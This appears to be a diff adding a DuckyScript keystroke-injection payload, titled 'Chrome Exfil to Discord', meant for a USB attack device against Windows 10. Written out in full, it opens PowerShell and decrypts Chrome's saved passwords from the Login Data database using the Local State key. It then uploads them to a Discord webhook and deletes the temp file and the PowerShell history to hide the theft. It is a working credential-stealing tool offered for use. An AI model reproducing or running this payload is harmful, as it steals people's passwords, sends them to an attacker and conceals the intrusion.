@@ -1,0 +1,101 @@
+REM Title: Chrome Exfil to Discord
+REM Author: thisismyrobot (edited by DoobTheGoober)
+REM Description: Opens PowerShell, grabs Chrome passwords, exfils via discord webhook
+REM Target: Windows 10 (PowerShell + Chrome)
+REM Version: 1.0
+REM Category: Exfiltration
+DELAY 1000
+GUI r
+DELAY 250
+STRING powershell
+ENTER
+DELAY 650
+STRING $webhook='WEBHOOK_ADDRESS'
+ENTER
+DELAY 1500
+STRING pwsh
+ENTER
+DELAY 1500
+STRING $d=Add-Type -A System.Security
+ENTER
+DELAY 550
+STRING $p='public static'
+ENTER
+DELAY 550
+STRING $g=""")]$p extern"
+ENTER
+DELAY 550
+STRING $i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
+ENTER
+DELAY 550
+STRING $m="[MarshalAs(UnmanagedType.LP"
+ENTER
+DELAY 550
+STRING $q='(s,i)'
+ENTER
+DELAY 550
+STRING $f='(p s,int i)'
+ENTER
+DELAY 550
+STRING $z=$env:LOCALAPPDATA+'\Google\Chrome\User Data'p
+ENTER
+DELAY 550
+STRING $u=[Security.Cryptography.ProtectedData]
+ENTER
+DELAY 1000
+STRING Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
+ENTER
+DELAY 1500
+STRING $s=[W]::O("$z\\Default\\Login Data",[ref]$d)
+ENTER
+DELAY 850
+STRING $l=@()
+ENTER
+DELAY 700
+STRING if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
+ENTER
+DELAY 800
+STRING $x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
+ENTER
+DELAY 700
+STRING for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
+ENTER
+DELAY 500
+STRING $c=[W]::B($s,5)
+ENTER
+DELAY 700
+STRING try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
+ENTER
+DELAY 700
+STRING $e=[byte[]]::new($k-31)
+ENTER
+DELAY 850
+STRING $x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}
+ENTER
+DELAY 850
+STRING $r=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(($l)-join','))
+ENTER
+DELAY 700
+STRING $r | Out-File -FilePath temp.txt
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 600
+STRING $content='Flipper Flap Feport Found Chrome Passwords'; $payload=[PSCustomObject]@{ content=$content }
+ENTER
+DELAY 1200
+STRING Invoke-RestMethod -ContentType "Application/Json" -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json)
+ENTER
+DELAY 1300
+STRING curl.exe -F "file1=@temp.txt" $webhook
+ENTER
+DELAY 1300
+STRING rm temp.txt
+ENTER
+DELAY 500
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
+ENTER
+DELAY 500
+STRING exit
+ENTER
